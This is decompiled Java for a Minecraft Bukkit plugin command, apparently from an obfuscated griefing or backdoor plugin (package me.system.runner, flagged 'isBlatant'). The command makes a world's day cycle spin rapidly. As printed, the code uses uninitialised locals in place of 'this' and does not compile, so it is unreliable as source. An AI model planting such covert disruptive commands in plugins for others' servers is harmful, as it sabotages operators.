/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.World
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import java.util.ArrayList;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class SpinCommand
extends Command {
    private final /* synthetic */ ArrayList<World> m7Xc2rTTyHdEsChfmjEDKe4B;

    @Override
    public boolean isBlatant() {
        return true;
    }

    public SpinCommand() {
        SpinCommand llllllllllllllIlIlIIlIIlIlIIlllI;
        llllllllllllllIlIlIIlIIlIlIIlllI.m7Xc2rTTyHdEsChfmjEDKe4B = new ArrayList();
    }

    @Override
    public void execute(Core llllllllllllllIlIlIIlIIlIlIIlIIl, String llllllllllllllIlIlIIlIIlIlIIlIII, String[] llllllllllllllIlIlIIlIIlIlIIIlll, Player llllllllllllllIlIlIIlIIlIlIIIIll) {
        SpinCommand llllllllllllllIlIlIIlIIlIlIIlIlI;
        if (llllllllllllllIlIlIIlIIlIlIIlIlI.m7Xc2rTTyHdEsChfmjEDKe4B.contains((Object)llllllllllllllIlIlIIlIIlIlIIIIll.getWorld())) {
            llllllllllllllIlIlIIlIIlIlIIlIlI.m7Xc2rTTyHdEsChfmjEDKe4B.remove((Object)llllllllllllllIlIlIIlIIlIlIIIIll.getWorld());
            llllllllllllllIlIlIIlIIlIlIIIIll.sendMessage(Settings.PREFIX("The world has stopped spinning!"));
        } else {
            llllllllllllllIlIlIIlIIlIlIIlIlI.m7Xc2rTTyHdEsChfmjEDKe4B.add(llllllllllllllIlIlIIlIIlIlIIIIll.getWorld());
            llllllllllllllIlIlIIlIIlIlIIIIll.sendMessage(Settings.PREFIX("The world is now spinning!"));
            Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask((Plugin)llllllllllllllIlIlIIlIIlIlIIlIIl, () -> {
                SpinCommand llllllllllllllIlIlIIlIIlIIllllIl;
                for (World llllllllllllllIlIlIIlIIlIIlllllI : llllllllllllllIlIlIIlIIlIIllllIl.m7Xc2rTTyHdEsChfmjEDKe4B) {
                    llllllllllllllIlIlIIlIIlIIlllllI.setTime(llllllllllllllIlIlIIlIIlIIlllllI.getTime() + 100L);
                }
            }, 1L, 1L);
        }
    }
}

